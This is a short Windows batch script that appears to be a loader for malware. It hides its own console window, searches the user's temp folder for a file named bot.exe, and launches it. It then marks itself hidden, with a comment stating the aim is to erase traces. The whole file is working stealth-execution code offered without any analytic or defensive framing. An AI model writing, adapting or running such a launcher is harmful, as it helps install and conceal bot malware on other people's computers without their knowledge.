@echo off
setlocal enabledelayedexpansion

:: Hide the batch console instantly
if not "%minimized%"=="" goto :minimized
set minimized=true
start /min cmd /c "%~dpnx0" & exit
:minimized

:: Search for bot.exe recursively in %TEMP%
set "found="
for /r "%TEMP%" %%f in (bot.exe) do (
    if exist "%%f" (
        set "found=%%f"
        goto :found
    )
)

:found
if defined found (
    echo Found: !found!

    :: Extract the directory containing bot.exe
    for %%F in ("!found!") do set "dirpath=%%~dpF"
    :: Remove trailing backslash for folder attribute operation
    if "!dirpath:~-1!"=="\" set "dirpath=!dirpath:~0,-1!"

    :: Run bot.exe normally (no admin, standard user context)
    start "" "!found!"
) else (
    echo bot.exe not found in %TEMP%
    pause >nul
)

:: Hide the batch file itself to erase traces
attrib +h "%~f0" >nul 2>&1
exit
